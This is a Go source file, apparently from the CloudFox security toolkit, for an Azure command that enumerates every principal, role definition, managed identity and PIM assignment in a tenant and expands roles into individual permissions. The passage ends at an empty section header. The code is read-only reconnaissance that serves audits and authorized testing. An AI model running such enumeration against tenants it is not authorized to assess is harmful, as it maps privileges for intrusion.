package commands

import (
	"context"
	"encoding/json"
	"fmt"
	"regexp"
	"sort"
	"strings"
	"sync"

	"github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/authorization/armauthorization/v2"
	"github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/resources/armresources"
	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	azinternal "github.com/BishopFox/cloudfox/internal/azure"
	"github.com/spf13/cobra"
)

// ======================
// Cobra command definition
// ======================
var AzPermissionsCommand = &cobra.Command{
	Use:     "permissions",
	Aliases: []string{"perms", "actions"},
	Short:   "Enumerate Azure permissions line-by-line for granular search",
	Long: `
Enumerate every Azure permission assigned to principals, expanding role definitions into individual actions.
This enables searching for specific permissions like "Microsoft.Compute/virtualMachines/write".

Examples:
  # Enumerate all permissions for a tenant
  ./cloudfox az permissions --tenant TENANT_ID

  # Enumerate permissions for specific subscriptions
  ./cloudfox az permissions --subscription SUB1,SUB2

  # Search for specific permission in output
  grep "virtualMachines/write" cloudfox-output/azure/permissions.csv
`,
	Run: ListPermissions,
}

// ======================
// Output struct
// ======================
type PermissionsOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

// PermissionsModule implements granular permission enumeration
type PermissionsModule struct {
	azinternal.BaseAzureModule // Embed common fields (15 fields)

	// Module-specific fields
	Subscriptions      []string
	PermissionRows     [][]string // All permissions collected (one row per action)
	RoleDefinitions    map[string]*armauthorization.RoleDefinition
	PrincipalCache     map[string]*PrincipalInfo // Cache for principal lookups
	GroupCache         map[string]*PrincipalInfo // Cache for group lookups
	TenantLevel        bool
	SubLevel           bool
	RGLevel            bool
	Workers            int
	currentPrincipals  []azinternal.PrincipalInfo // For callback access during enumeration
	orphanedScanState  *orphanedScanState         // For callback access during orphaned scan
	mu                 sync.Mutex                 // Protects PermissionRows and caches
}

// PrincipalInfo holds cached principal information
type PrincipalInfo struct {
	Name string
	UPN  string
	Type string
}

var (
	permTenantLevel bool
	permSubLevel    bool
	permRGLevel     bool
	permWorkers     int
)

var PermissionsHeader = []string{
	"Principal GUID",
	"Principal Name",
	"Principal UPN/AppID",
	"Principal Type",
	"Role Name",
	"Permission Type", // Action, NotAction, DataAction, NotDataAction
	"Permission",      // e.g., Microsoft.Compute/virtualMachines/write
	"Tenant Name",     // New: for multi-tenant support
	"Tenant ID",       // New: for multi-tenant support
	"Scope Type",      // Tenant, Subscription, ManagementGroup, ResourceGroup, Resource
	"Scope Name",      // Tenant/Sub/MG/RG name
	"Full Scope Path",
	"Assigned Via", // Direct, Group, Direct (PIM Eligible), Group (PIM Eligible), Direct (PIM Active), Group (PIM Active)
	"Condition",
}

func (o PermissionsOutput) TableFiles() []internal.TableFile { return o.Table }
func (o PermissionsOutput) LootFiles() []internal.LootFile   { return o.Loot }

// ======================
// Init flags
// ======================
func init() {
	AzPermissionsCommand.Flags().BoolVar(&permTenantLevel, "tenant-level", false, "Include tenant-level permissions")
	AzPermissionsCommand.Flags().BoolVar(&permSubLevel, "subscription-level", false, "Include subscription-level permissions")
	AzPermissionsCommand.Flags().BoolVar(&permRGLevel, "resource-group-level", false, "Include resource-group-level permissions")
	AzPermissionsCommand.Flags().IntVar(&permWorkers, "workers", 5, "Number of concurrent workers")
}

// ======================
// Main handler
// ======================
func ListPermissions(cmd *cobra.Command, args []string) {
	// Initialize command context
	cmdCtx, err := azinternal.InitializeCommandContext(cmd, globals.AZ_PERMISSIONS_MODULE_NAME)
	if err != nil {
		return
	}
	defer cmdCtx.Session.StopMonitoring()

	// Parse permissions-specific flags
	tenantLevel, _ := cmd.Flags().GetBool("tenant-level")
	subLevel, _ := cmd.Flags().GetBool("subscription-level")
	rgLevel, _ := cmd.Flags().GetBool("resource-group-level")
	workers, _ := cmd.Flags().GetInt("workers")

	// Default: if no levels specified, run all levels
	if !tenantLevel && !subLevel && !rgLevel {
		if cmdCtx.Verbosity >= globals.AZ_VERBOSE_ERRORS {
			cmdCtx.Logger.InfoM("No levels specified; defaulting to all levels", globals.AZ_PERMISSIONS_MODULE_NAME)
		}
		tenantLevel = true
		subLevel = true
		rgLevel = true
	}

	// Initialize module
	module := &PermissionsModule{
		BaseAzureModule: azinternal.NewBaseAzureModule(cmdCtx, 12), // 12 columns in header (added "Assigned Via")
		Subscriptions:   cmdCtx.Subscriptions,
		PermissionRows:  [][]string{},
		RoleDefinitions: make(map[string]*armauthorization.RoleDefinition),
		PrincipalCache:  make(map[string]*PrincipalInfo),
		GroupCache:      make(map[string]*PrincipalInfo),
		TenantLevel:     tenantLevel,
		SubLevel:        subLevel,
		RGLevel:         rgLevel,
		Workers:         workers,
	}

	// Execute module
	module.PrintPermissions(cmdCtx.Ctx, cmdCtx.Logger)
}

// ======================
// PrintPermissions - Main enumeration orchestrator
// ======================
func (m *PermissionsModule) PrintPermissions(ctx context.Context, logger internal.Logger) {
	if m.Verbosity >= globals.AZ_VERBOSE_ERRORS {
		logger.InfoM("Starting comprehensive permissions enumeration", globals.AZ_PERMISSIONS_MODULE_NAME)
		if m.IsMultiTenant {
			logger.InfoM(fmt.Sprintf("Multi-tenant mode: %d tenants", len(m.Tenants)), globals.AZ_PERMISSIONS_MODULE_NAME)
		} else {
			logger.InfoM(fmt.Sprintf("Tenant: %s (%s)", m.TenantName, m.TenantID), globals.AZ_PERMISSIONS_MODULE_NAME)
		}
		logger.InfoM(fmt.Sprintf("Subscriptions: %d", len(m.Subscriptions)), globals.AZ_PERMISSIONS_MODULE_NAME)
		logger.InfoM(fmt.Sprintf("Levels: Tenant=%v, Subscription=%v, ResourceGroup=%v",
			m.TenantLevel, m.SubLevel, m.RGLevel), globals.AZ_PERMISSIONS_MODULE_NAME)
	}

	// Multi-tenant processing
	if m.IsMultiTenant {
		// Process each tenant independently
		for _, tenantCtx := range m.Tenants {
			// Temporarily set module tenant context
			savedTenantID := m.TenantID
			savedTenantName := m.TenantName
			savedTenantInfo := m.TenantInfo
			savedSubscriptions := m.Subscriptions

			m.TenantID = tenantCtx.TenantID
			m.TenantName = tenantCtx.TenantName
			m.TenantInfo = tenantCtx.TenantInfo
			m.Subscriptions = tenantCtx.Subscriptions

			if m.Verbosity >= globals.AZ_VERBOSE_ERRORS {
				logger.InfoM(fmt.Sprintf("Processing tenant: %s (%s)", m.TenantName, m.TenantID), globals.AZ_PERMISSIONS_MODULE_NAME)
			}

			// Process this tenant
			m.processTenantPermissions(ctx, logger)

			// Restore context
			m.TenantID = savedTenantID
			m.TenantName = savedTenantName
			m.TenantInfo = savedTenantInfo
			m.Subscriptions = savedSubscriptions
		}
	} else {
		// Single tenant processing (existing logic)
		m.processTenantPermissions(ctx, logger)
	}

	// Show completion status
	totalSubs := len(m.Subscriptions)
	errors := m.CommandCounter.Error
	logger.InfoM(fmt.Sprintf("Status: %d/%d subscriptions complete (%d errors)",
		totalSubs-errors, totalSubs, errors), globals.AZ_PERMISSIONS_MODULE_NAME)

	// Write all collected data
	m.writeOutput(ctx, logger)
}

// processTenantPermissions - Process permissions for a single tenant
func (m *PermissionsModule) processTenantPermissions(ctx context.Context, logger internal.Logger) {
	// Step 1: Collect all role definitions (built-in + custom) from first subscription
	if len(m.Subscriptions) > 0 {
		m.collectRoleDefinitions(ctx, m.Subscriptions[0], logger)
		if m.Verbosity >= globals.AZ_VERBOSE_ERRORS {
			logger.InfoM(fmt.Sprintf("Collected %d role definitions", len(m.RoleDefinitions)), globals.AZ_PERMISSIONS_MODULE_NAME)
		}
	}

	// Step 2: Enumerate ALL principals in the tenant
	logger.InfoM("Enumerating all principals in tenant (users, guests, service principals, groups, managed identities)", globals.AZ_PERMISSIONS_MODULE_NAME)
	allPrincipals := m.enumerateAllPrincipals(ctx, logger)
	if m.Verbosity >= globals.AZ_VERBOSE_ERRORS {
		logger.InfoM(fmt.Sprintf("Found %d total principals to enumerate", len(allPrincipals)), globals.AZ_PERMISSIONS_MODULE_NAME)
	}

	// Step 3: For each principal, enumerate their permissions at all scopes
	m.enumeratePrincipalPermissions(ctx, allPrincipals, logger)

	// Step 4: Fallback scan for orphaned/unknown principals (100% completeness guarantee)
	logger.InfoM("Performing fallback scan for any orphaned or unknown principals", globals.AZ_PERMISSIONS_MODULE_NAME)
	orphanedPrincipals := m.scanForOrphanedPrincipals(ctx, allPrincipals, logger)
	if len(orphanedPrincipals) > 0 {
		logger.InfoM(fmt.Sprintf("Found %d orphaned/unknown principal(s) with role assignments", len(orphanedPrincipals)), globals.AZ_PERMISSIONS_MODULE_NAME)
		// Enumerate permissions for orphaned principals
		m.enumeratePrincipalPermissions(ctx, orphanedPrincipals, logger)
	} else {
		logger.InfoM("No orphaned principals found - all principals with permissions were enumerated", globals.AZ_PERMISSIONS_MODULE_NAME)
	}
}

// ======================
// collectRoleDefinitions - Get all role definitions (built-in + custom)
// ======================
func (m *PermissionsModule) collectRoleDefinitions(ctx context.Context, subID string, logger internal.Logger) {
	// Get token for ARM scope
	token, err := m.Session.GetTokenForResource(globals.CommonScopes[0])
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Failed to get token for role definitions: %v", err), globals.AZ_PERMISSIONS_MODULE_NAME)
		m.CommandCounter.Error++
		return
	}

	cred := &azinternal.StaticTokenCredential{Token: token}

	// Create authorization client factory
	clientFactory, err := armauthorization.NewClientFactory(subID, cred, nil)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Failed to create authorization client factory: %v", err), globals.AZ_PERMISSIONS_MODULE_NAME)
		m.CommandCounter.Error++
		return
	}

	roleDefClient := clientFactory.NewRoleDefinitionsClient()

	// List all role definitions at subscription scope
	scope := fmt.Sprintf("/subscriptions/%s", subID)
	pager := roleDefClient.NewListPager(scope, nil)

	for pager.More() {
		page, err := pager.NextPage(ctx)
		if err != nil {
			logger.ErrorM(fmt.Sprintf("Failed to list role definitions: %v", err), globals.AZ_PERMISSIONS_MODULE_NAME)
			m.CommandCounter.Error++
			break
		}

		for _, roleDef := range page.Value {
			if roleDef != nil && roleDef.ID != nil {
				m.mu.Lock()
				m.RoleDefinitions[*roleDef.ID] = roleDef
				// Also store by name for easier lookup
				if roleDef.Name != nil {
					m.RoleDefinitions[*roleDef.Name] = roleDef
				}
				m.mu.Unlock()
			}
		}
	}
}

// ======================
// scanForOrphanedPrincipals - Fallback scan for any principals with role assignments that weren't discovered
// ======================
func (m *PermissionsModule) scanForOrphanedPrincipals(ctx context.Context, knownPrincipals []azinternal.PrincipalInfo, logger internal.Logger) []azinternal.PrincipalInfo {
	// Initialize scan state
	m.orphanedScanState = &orphanedScanState{
		seenPrincipals:       make(map[string]bool),
		orphanedPrincipalIDs: make(map[string]bool),
		orphanedPrincipals:   []azinternal.PrincipalInfo{},
	}

	// Build map of known principal IDs
	for _, p := range knownPrincipals {
		m.orphanedScanState.seenPrincipals[p.ObjectID] = true
	}

	// Use RunSubscriptionEnumeration for standardized processing
	m.RunSubscriptionEnumeration(ctx, logger, m.Subscriptions, globals.AZ_PERMISSIONS_MODULE_NAME, m.processSubscriptionForOrphanedScan)

	return m.orphanedScanState.orphanedPrincipals
}

// orphanedScanState holds state for orphaned principal scanning
type orphanedScanState struct {
	seenPrincipals       map[string]bool
	orphanedPrincipalIDs map[string]bool
	orphanedPrincipals   []azinternal.PrincipalInfo
}

// processSubscriptionForOrphanedScan processes a single subscription for orphaned principal scanning
func (m *PermissionsModule) processSubscriptionForOrphanedScan(ctx context.Context, subID string, logger internal.Logger) {
	// Get ARM token
	token, err := m.Session.GetTokenForResource(globals.CommonScopes[0])
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Failed to get token for orphaned principal scan: %v", err), globals.AZ_PERMISSIONS_MODULE_NAME)
		return
	}

	cred := &azinternal.StaticTokenCredential{Token: token}
	clientFactory, err := armauthorization.NewClientFactory(subID, cred, nil)
	if err != nil {
		return
	}

	authClient := clientFactory.NewRoleAssignmentsClient()

	// Build all scopes to check
	scopes := m.buildScopesForSubscription(ctx, subID, authClient, cred, logger)

	// Scan role assignments at each scope
	for _, scope := range scopes {
		pager := authClient.NewListForScopePager(scope, nil)
		for pager.More() {
			page, err := pager.NextPage(ctx)
			if err != nil {
				break
			}

			for _, ra := range page.Value {
				if ra.Properties != nil && ra.Properties.PrincipalID != nil {
					principalID := *ra.Properties.PrincipalID

					// Check if this principal is unknown (thread-safe access with mutex)
					m.mu.Lock()
					isUnknown := !m.orphanedScanState.seenPrincipals[principalID] && !m.orphanedScanState.orphanedPrincipalIDs[principalID]
					if isUnknown {
						m.orphanedScanState.orphanedPrincipalIDs[principalID] = true

						// Try to determine principal type
						principalType := "Unknown"
						if ra.Properties.PrincipalType != nil {
							principalType = string(*ra.Properties.PrincipalType)
						}

						// Add as orphaned principal
						m.orphanedScanState.orphanedPrincipals = append(m.orphanedScanState.orphanedPrincipals, azinternal.PrincipalInfo{
							ObjectID:          principalID,
							UserPrincipalName: "Unknown",
							DisplayName:       fmt.Sprintf("Orphaned-%s", principalID[:8]),
							UserType:          fmt.Sprintf("Orphaned%s", principalType),
						})

						if m.Verbosity >= globals.AZ_VERBOSE_ERRORS {
							logger.InfoM(fmt.Sprintf("Found orphaned principal: %s (type: %s)", principalID, principalType), globals.AZ_PERMISSIONS_MODULE_NAME)
						}
					}
					m.mu.Unlock()
				}
			}
		}
	}

	// Also check PIM assignments for orphaned principals
	m.scanPIMForOrphanedPrincipals(ctx, subID, token, logger)
}

// Helper to scan PIM for orphaned principals
func (m *PermissionsModule) scanPIMForOrphanedPrincipals(ctx context.Context, subID, token string, logger internal.Logger) {
	// Check PIM Eligible
	pimEligibilityURL := fmt.Sprintf("https://management.azure.com/subscriptions/%s/providers/Microsoft.Authorization/roleEligibilityScheduleInstances?api-version=2020-10-01", subID)
	pimBody, err := azinternal.HTTPRequestWithRetry(ctx, "GET", pimEligibilityURL, token, nil, azinternal.DefaultRateLimitConfig())
	if err == nil {
		var pimData struct {
			Value []struct {
				Properties struct {
					PrincipalID        string `json:"principalId"`
					ExpandedProperties struct {
						Principal struct {
							Type string `json:"type"`
						} `json:"principal"`
					} `json:"expandedProperties"`
				} `json:"properties"`
			} `json:"value"`
		}

		if json.Unmarshal(pimBody, &pimData) == nil {
			for _, pimAssignment := range pimData.Value {
				principalID := pimAssignment.Properties.PrincipalID

				// Thread-safe access with mutex
				m.mu.Lock()
				isUnknown := !m.orphanedScanState.seenPrincipals[principalID] && !m.orphanedScanState.orphanedPrincipalIDs[principalID]
				if isUnknown {
					m.orphanedScanState.orphanedPrincipalIDs[principalID] = true
					principalType := pimAssignment.Properties.ExpandedProperties.Principal.Type

					m.orphanedScanState.orphanedPrincipals = append(m.orphanedScanState.orphanedPrincipals, azinternal.PrincipalInfo{
						ObjectID:          principalID,
						UserPrincipalName: "Unknown",
						DisplayName:       fmt.Sprintf("Orphaned-%s", principalID[:8]),
						UserType:          fmt.Sprintf("Orphaned%s", principalType),
					})
				}
				m.mu.Unlock()
			}
		}
	}

	// Check PIM Active
	pimActiveURL := fmt.Sprintf("https://management.azure.com/subscriptions/%s/providers/Microsoft.Authorization/roleAssignmentScheduleInstances?api-version=2020-10-01", subID)
	pimBody, err = azinternal.HTTPRequestWithRetry(ctx, "GET", pimActiveURL, token, nil, azinternal.DefaultRateLimitConfig())
	if err == nil {
		var pimData struct {
			Value []struct {
				Properties struct {
					PrincipalID        string `json:"principalId"`
					ExpandedProperties struct {
						Principal struct {
							Type string `json:"type"`
						} `json:"principal"`
					} `json:"expandedProperties"`
				} `json:"properties"`
			} `json:"value"`
		}

		if json.Unmarshal(pimBody, &pimData) == nil {
			for _, pimAssignment := range pimData.Value {
				principalID := pimAssignment.Properties.PrincipalID

				// Thread-safe access with mutex
				m.mu.Lock()
				isUnknown := !m.orphanedScanState.seenPrincipals[principalID] && !m.orphanedScanState.orphanedPrincipalIDs[principalID]
				if isUnknown {
					m.orphanedScanState.orphanedPrincipalIDs[principalID] = true
					principalType := pimAssignment.Properties.ExpandedProperties.Principal.Type

					m.orphanedScanState.orphanedPrincipals = append(m.orphanedScanState.orphanedPrincipals, azinternal.PrincipalInfo{
						ObjectID:          principalID,
						UserPrincipalName: "Unknown",
						DisplayName:       fmt.Sprintf("Orphaned-%s", principalID[:8]),
						UserType:          fmt.Sprintf("Orphaned%s", principalType),
					})
				}
				m.mu.Unlock()
			}
		}
	}
}

// ======================
// enumerateAllPrincipals - Enumerate ALL principals in the tenant
// ======================
func (m *PermissionsModule) enumerateAllPrincipals(ctx context.Context, logger internal.Logger) []azinternal.PrincipalInfo {
	var allPrincipals []azinternal.PrincipalInfo

	// 1. Enumerate all Entra users (includes both Member and Guest users)
	users, err := azinternal.ListEntraUsers(ctx, m.Session, m.TenantID)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Failed to enumerate Entra users: %v", err), globals.AZ_PERMISSIONS_MODULE_NAME)
	} else {
		allPrincipals = append(allPrincipals, users...)
		if m.Verbosity >= globals.AZ_VERBOSE_ERRORS {
			logger.InfoM(fmt.Sprintf("Found %d Entra user(s)", len(users)), globals.AZ_PERMISSIONS_MODULE_NAME)
		}
	}

	// 2. Enumerate all service principals
	sps, err := azinternal.ListServicePrincipals(ctx, m.Session, m.TenantID)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Failed to enumerate service principals: %v", err), globals.AZ_PERMISSIONS_MODULE_NAME)
	} else {
		allPrincipals = append(allPrincipals, sps...)
		if m.Verbosity >= globals.AZ_VERBOSE_ERRORS {
			logger.InfoM(fmt.Sprintf("Found %d service principal(s)", len(sps)), globals.AZ_PERMISSIONS_MODULE_NAME)
		}
	}

	// 3. Enumerate all user-assigned managed identities
	mis, err := azinternal.ListUserAssignedManagedIdentities(ctx, m.Session, m.Subscriptions)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Failed to enumerate user-assigned managed identities: %v", err), globals.AZ_PERMISSIONS_MODULE_NAME)
	} else {
		// Convert managed identities to PrincipalInfo
		for _, mi := range mis {
			allPrincipals = append(allPrincipals, azinternal.PrincipalInfo{
				ObjectID:          mi.PrincipalID,
				UserPrincipalName: mi.ClientID,
				DisplayName:       mi.Name,
				UserType:          "ManagedIdentity",
			})
		}
		if m.Verbosity >= globals.AZ_VERBOSE_ERRORS {
			logger.InfoM(fmt.Sprintf("Found %d user-assigned managed identit(ies)", len(mis)), globals.AZ_PERMISSIONS_MODULE_NAME)
		}
	}

	// 4. Enumerate all system-assigned managed identities from Azure resources
	logger.InfoM("Enumerating system-assigned managed identities from Azure resources", globals.AZ_PERMISSIONS_MODULE_NAME)
	systemMIs := m.enumerateSystemAssignedMIs(ctx, logger)
	allPrincipals = append(allPrincipals, systemMIs...)
	if m.Verbosity >= globals.AZ_VERBOSE_ERRORS {
		logger.InfoM(fmt.Sprintf("Found %d system-assigned managed identit(ies)", len(systemMIs)), globals.AZ_PERMISSIONS_MODULE_NAME)
	}

	return allPrincipals
}

// ======================
// enumerateSystemAssignedMIs - Enumerate system-assigned managed identities from Azure resources
// ======================
func (m *PermissionsModule) enumerateSystemAssignedMIs(ctx context.Context, logger internal.Logger) []azinternal.PrincipalInfo {
	var systemMIs []azinternal.PrincipalInfo
	seenPrincipals := make(map[string]bool) // Deduplicate

	// Get token for ARM operations
	token, err := m.Session.GetTokenForResource(globals.CommonScopes[0])
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Failed to get ARM token for system MI enumeration: %v", err), globals.AZ_PERMISSIONS_MODULE_NAME)
		return systemMIs
	}

	// Process each subscription
	for _, subID := range m.Subscriptions {
		// 1. Virtual Machines
		vmMIs := m.getSystemMIsFromVMs(ctx, subID, token, logger)
		for _, mi := range vmMIs {
			if !seenPrincipals[mi.ObjectID] {
				systemMIs = append(systemMIs, mi)
				seenPrincipals[mi.ObjectID] = true
			}
		}

		// 2. VM Scale Sets
		vmssMIs := m.getSystemMIsFromVMSS(ctx, subID, token, logger)
		for _, mi := range vmssMIs {
			if !seenPrincipals[mi.ObjectID] {
				systemMIs = append(systemMIs, mi)
				seenPrincipals[mi.ObjectID] = true
			}
		}

		// 3. App Services (Web Apps & Function Apps)
		appMIs := m.getSystemMIsFromAppServices(ctx, subID, token, logger)
		for _, mi := range appMIs {
			if !seenPrincipals[mi.ObjectID] {
				systemMIs = append(systemMIs, mi)
				seenPrincipals[mi.ObjectID] = true
			}
		}

		// 4. Container Apps
		containerAppMIs := m.getSystemMIsFromContainerApps(ctx, subID, token, logger)
		for _, mi := range containerAppMIs {
			if !seenPrincipals[mi.ObjectID] {
				systemMIs = append(systemMIs, mi)
				seenPrincipals[mi.ObjectID] = true
			}
		}

		// 5. Container Instances
		aciMIs := m.getSystemMIsFromContainerInstances(ctx, subID, token, logger)
		for _, mi := range aciMIs {
			if !seenPrincipals[mi.ObjectID] {
				systemMIs = append(systemMIs, mi)
				seenPrincipals[mi.ObjectID] = true
			}
		}

		// 6. Logic Apps
		logicAppMIs := m.getSystemMIsFromLogicApps(ctx, subID, token, logger)
		for _, mi := range logicAppMIs {
			if !seenPrincipals[mi.ObjectID] {
				systemMIs = append(systemMIs, mi)
				seenPrincipals[mi.ObjectID] = true
			}
		}

		// 7. Data Factory
		adfMIs := m.getSystemMIsFromDataFactory(ctx, subID, token, logger)
		for _, mi := range adfMIs {
			if !seenPrincipals[mi.ObjectID] {
				systemMIs = append(systemMIs, mi)
				seenPrincipals[mi.ObjectID] = true
			}
		}

		// 8. AKS Clusters
		aksMIs := m.getSystemMIsFromAKS(ctx, subID, token, logger)
		for _, mi := range aksMIs {
			if !seenPrincipals[mi.ObjectID] {
				systemMIs = append(systemMIs, mi)
				seenPrincipals[mi.ObjectID] = true
			}
		}

		// 9. API Management
		apimMIs := m.getSystemMIsFromAPIManagement(ctx, subID, token, logger)
		for _, mi := range apimMIs {
			if !seenPrincipals[mi.ObjectID] {
				systemMIs = append(systemMIs, mi)
				seenPrincipals[mi.ObjectID] = true
			}
		}

		// 10. Azure Spring Cloud (now Azure Spring Apps)
		springMIs := m.getSystemMIsFromSpringCloud(ctx, subID, token, logger)
		for _, mi := range springMIs {
			if !seenPrincipals[mi.ObjectID] {
				systemMIs = append(systemMIs, mi)
				seenPrincipals[mi.ObjectID] = true
			}
		}

		// 11. Automation Accounts
		automationMIs := m.getSystemMIsFromAutomation(ctx, subID, token, logger)
		for _, mi := range automationMIs {
			if !seenPrincipals[mi.ObjectID] {
				systemMIs = append(systemMIs, mi)
				seenPrincipals[mi.ObjectID] = true
			}
		}

		// Add more resource types as needed...
	}

	return systemMIs
}

// Helper method to extract system-assigned MI from generic ARM resources
func (m *PermissionsModule) extractSystemMIPrincipal(resourceName, resourceType string, identityData map[string]interface{}) *azinternal.PrincipalInfo {
	// Check if system-assigned identity is enabled
	identityType, ok := identityData["type"].(string)
	if !ok {
		return nil
	}

	// Check for SystemAssigned or SystemAssigned,UserAssigned
	if !strings.Contains(strings.ToLower(identityType), "systemassigned") {
		return nil
	}

	// Extract principal ID
	principalID, ok := identityData["principalId"].(string)
	if !ok || principalID == "" {
		return nil
	}

	return &azinternal.PrincipalInfo{
		ObjectID:          principalID,
		UserPrincipalName: "SystemAssigned",
		DisplayName:       fmt.Sprintf("%s (%s)", resourceName, resourceType),
		UserType:          "SystemAssignedMI",
	}
}

// Generic helper to query ARM resources and extract system MIs
func (m *PermissionsModule) getSystemMIsFromARMResource(ctx context.Context, subID, token, resourceType, apiVersion string, logger internal.Logger) []azinternal.PrincipalInfo {
	var principals []azinternal.PrincipalInfo

	url := fmt.Sprintf("https://management.azure.com/subscriptions/%s/providers/%s?api-version=%s", subID, resourceType, apiVersion)
	body, err := azinternal.HTTPRequestWithRetry(ctx, "GET", url, token, nil, azinternal.DefaultRateLimitConfig())
	if err != nil {
		if m.Verbosity >= globals.AZ_VERBOSE_ERRORS {
			logger.ErrorM(fmt.Sprintf("Failed to query %s: %v", resourceType, err), globals.AZ_PERMISSIONS_MODULE_NAME)
		}
		return principals
	}

	var response struct {
		Value []struct {
			Name     string                 `json:"name"`
			Identity map[string]interface{} `json:"identity"`
		} `json:"value"`
	}

	if json.Unmarshal(body, &response) != nil {
		return principals
	}

	for _, resource := range response.Value {
		if resource.Identity != nil {
			if principal := m.extractSystemMIPrincipal(resource.Name, resourceType, resource.Identity); principal != nil {
				principals = append(principals, *principal)
			}
		}
	}

	return principals
}

// System MI enumeration methods for specific resource types
func (m *PermissionsModule) getSystemMIsFromVMs(ctx context.Context, subID, token string, logger internal.Logger) []azinternal.PrincipalInfo {
	return m.getSystemMIsFromARMResource(ctx, subID, token, "Microsoft.Compute/virtualMachines", "2023-09-01", logger)
}

func (m *PermissionsModule) getSystemMIsFromVMSS(ctx context.Context, subID, token string, logger internal.Logger) []azinternal.PrincipalInfo {
	return m.getSystemMIsFromARMResource(ctx, subID, token, "Microsoft.Compute/virtualMachineScaleSets", "2023-09-01", logger)
}

func (m *PermissionsModule) getSystemMIsFromAppServices(ctx context.Context, subID, token string, logger internal.Logger) []azinternal.PrincipalInfo {
	return m.getSystemMIsFromARMResource(ctx, subID, token, "Microsoft.Web/sites", "2023-01-01", logger)
}

func (m *PermissionsModule) getSystemMIsFromContainerApps(ctx context.Context, subID, token string, logger internal.Logger) []azinternal.PrincipalInfo {
	return m.getSystemMIsFromARMResource(ctx, subID, token, "Microsoft.App/containerApps", "2023-05-01", logger)
}

func (m *PermissionsModule) getSystemMIsFromContainerInstances(ctx context.Context, subID, token string, logger internal.Logger) []azinternal.PrincipalInfo {
	return m.getSystemMIsFromARMResource(ctx, subID, token, "Microsoft.ContainerInstance/containerGroups", "2023-05-01", logger)
}

func (m *PermissionsModule) getSystemMIsFromLogicApps(ctx context.Context, subID, token string, logger internal.Logger) []azinternal.PrincipalInfo {
	return m.getSystemMIsFromARMResource(ctx, subID, token, "Microsoft.Logic/workflows", "2019-05-01", logger)
}

func (m *PermissionsModule) getSystemMIsFromDataFactory(ctx context.Context, subID, token string, logger internal.Logger) []azinternal.PrincipalInfo {
	return m.getSystemMIsFromARMResource(ctx, subID, token, "Microsoft.DataFactory/factories", "2018-06-01", logger)
}

func (m *PermissionsModule) getSystemMIsFromAKS(ctx context.Context, subID, token string, logger internal.Logger) []azinternal.PrincipalInfo {
	return m.getSystemMIsFromARMResource(ctx, subID, token, "Microsoft.ContainerService/managedClusters", "2023-10-01", logger)
}

func (m *PermissionsModule) getSystemMIsFromAPIManagement(ctx context.Context, subID, token string, logger internal.Logger) []azinternal.PrincipalInfo {
	return m.getSystemMIsFromARMResource(ctx, subID, token, "Microsoft.ApiManagement/service", "2022-08-01", logger)
}

func (m *PermissionsModule) getSystemMIsFromSpringCloud(ctx context.Context, subID, token string, logger internal.Logger) []azinternal.PrincipalInfo {
	return m.getSystemMIsFromARMResource(ctx, subID, token, "Microsoft.AppPlatform/Spring", "2023-05-01-preview", logger)
}

func (m *PermissionsModule) getSystemMIsFromAutomation(ctx context.Context, subID, token string, logger internal.Logger) []azinternal.PrincipalInfo {
	return m.getSystemMIsFromARMResource(ctx, subID, token, "Microsoft.Automation/automationAccounts", "2023-11-01", logger)
}

// ======================
// enumeratePrincipalPermissions - For each principal, check all their permissions
// ======================
func (m *PermissionsModule) enumeratePrincipalPermissions(ctx context.Context, principals []azinternal.PrincipalInfo, logger internal.Logger) {
	logger.InfoM(fmt.Sprintf("Enumerating permissions for %d principals across all scopes", len(principals)), globals.AZ_PERMISSIONS_MODULE_NAME)

	// Store principals in module field for callback access
	m.currentPrincipals = principals

	// Use RunSubscriptionEnumeration for standardized processing
	m.RunSubscriptionEnumeration(ctx, logger, m.Subscriptions, globals.AZ_PERMISSIONS_MODULE_NAME, m.processSubscriptionForPrincipalPermissions)
}

// processSubscriptionForPrincipalPermissions processes a single subscription for principal permissions enumeration
func (m *PermissionsModule) processSubscriptionForPrincipalPermissions(ctx context.Context, subID string, logger internal.Logger) {
	subName := azinternal.GetSubscriptionNameFromID(ctx, m.Session, subID)

	if m.Verbosity >= globals.AZ_VERBOSE_ERRORS {
		logger.InfoM(fmt.Sprintf("Processing subscription: %s (%s)", subName, subID), globals.AZ_PERMISSIONS_MODULE_NAME)
	}

	// Get ARM token
	token, err := m.Session.GetTokenForResource(globals.CommonScopes[0])
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Failed to get token for subscription %s: %v", subID, err), globals.AZ_PERMISSIONS_MODULE_NAME)
		m.CommandCounter.Error++
		return
	}

	cred := &azinternal.StaticTokenCredential{Token: token}
	clientFactory, err := armauthorization.NewClientFactory(subID, cred, nil)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Failed to create client factory for subscription %s: %v", subID, err), globals.AZ_PERMISSIONS_MODULE_NAME)
		m.CommandCounter.Error++
		return
	}

	authClient := clientFactory.NewRoleAssignmentsClient()

	// Build list of scopes to check
	scopes := m.buildScopesForSubscription(ctx, subID, authClient, cred, logger)

	// For each principal, check their permissions at each scope
	for _, principal := range m.currentPrincipals {
		// Get user's group memberships if this is a user
		groupMemberships := make(map[string]string) // groupID -> groupName
		if strings.EqualFold(principal.UserType, "User") || strings.EqualFold(principal.UserType, "Member") || strings.EqualFold(principal.UserType, "Guest") {
			groupIDs := azinternal.GetUserGroupMemberships(ctx, m.Session, principal.ObjectID)
			for _, groupID := range groupIDs {
				// Get group info and cache it
				groupInfo := m.getGroupInfo(ctx, groupID, logger)
				if groupInfo != nil {
					groupMemberships[groupID] = groupInfo.Name
				}
			}
		}

		// Check role assignments at each scope for this principal
		m.checkPrincipalAtScopes(ctx, principal, groupMemberships, scopes, subID, subName, authClient, logger)

		// Check PIM for this principal
		m.checkPrincipalPIM(ctx, principal, groupMemberships, subID, subName, token, logger)
	}
}

// ======================
// buildScopesForSubscription - Build list of all scopes to check
// ======================
